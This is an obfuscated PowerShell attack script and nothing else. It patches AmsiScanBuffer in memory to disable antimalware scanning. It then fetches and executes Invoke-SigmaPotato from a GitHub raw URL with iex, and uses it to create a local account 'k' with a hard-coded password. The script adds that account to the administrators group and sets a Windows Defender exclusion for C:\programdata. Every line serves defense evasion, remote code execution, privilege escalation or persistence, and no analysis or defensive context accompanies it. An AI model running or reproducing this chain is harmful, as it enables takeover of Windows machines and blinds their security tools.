#Rasta-mouses Amsi-Scan-Buffer patch \n
$qMY8oUk_OtSOeSLZ = @"
using System;
using System.Runtime.InteropServices;
public class qMY8oUk_OtSOeSLZ {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr XJnopb56xvr, string kc1PPgGpZWE7jMIpzGYO);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr Zhj, UIntPtr PHIVX0aivw5XfhjKY, uint Klev_iH, out uint W6BwMDMnXCxqPcPCB);
}
"@

Add-Type $qMY8oUk_OtSOeSLZ

$y60l2g7Vq8YIUSeZl = [qMY8oUk_OtSOeSLZ]::LoadLibrary("$(('ámsì.d'+'ll').NormAliZE([chAr]([byTe]0x46)+[chAr]([bYte]0x6f)+[chAr](114+72-72)+[CHAr]([bYTe]0x6d)+[CHaR](68+43-43)) -replace [CHar](92*70/70)+[chAr]([BYtE]0x70)+[chaR]([bYTe]0x7b)+[cHAr](77+16-16)+[ChaR](110*19/19)+[cHAr]([bYTE]0x7d))")
$VWpMpfsN3S = [qMY8oUk_OtSOeSLZ]::GetProcAddress($y60l2g7Vq8YIUSeZl, "$(('ÂmsíS'+'cânBù'+'ffêr').NOrMALIZE([Char]([byte]0x46)+[ChAr]([BytE]0x6f)+[CHAR]([bYtE]0x72)+[ChAR]([bYTE]0x6d)+[cHAr](5+63)) -replace [cHar](92+7-7)+[CHar]([bYtE]0x70)+[ChaR](22+101)+[char]([BYte]0x4d)+[CHaR]([bYTE]0x6e)+[Char](125+94-94))")
$p = 0
[qMY8oUk_OtSOeSLZ]::VirtualProtect($VWpMpfsN3S, [uint32]5, 0x40, [ref]$p)
$g0TSlV = "0xB8"
$hm_d = "0x57"
$uTsTgdc2fbPQe9hZp25 = "0x00"
$zP_zLHIZVJqCkOB065pQ = "0x07"
$bQqQoSsNdqUP = "0x80"
$aBhINi = "0xC3"
$x8Q = [Byte[]] ($g0TSlV,$hm_d,$uTsTgdc2fbPQe9hZp25,$zP_zLHIZVJqCkOB065pQ,+$bQqQoSsNdqUP,+$aBhINi)
[System.Runtime.InteropServices.Marshal]::Copy($x8Q, 0, $VWpMpfsN3S, 6)
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/farzas1/bad/refs/heads/main/Invoke-SigmaPotato.ps1')
Invoke-SigmaPotato -command "net user k kopq@123 /add"
Invoke-SigmaPotato -command "net localgroup administrators k /add"
Invoke-SigmaPotato -command "powershell Add-MpPreference -ExclusionPath C:\programdata"











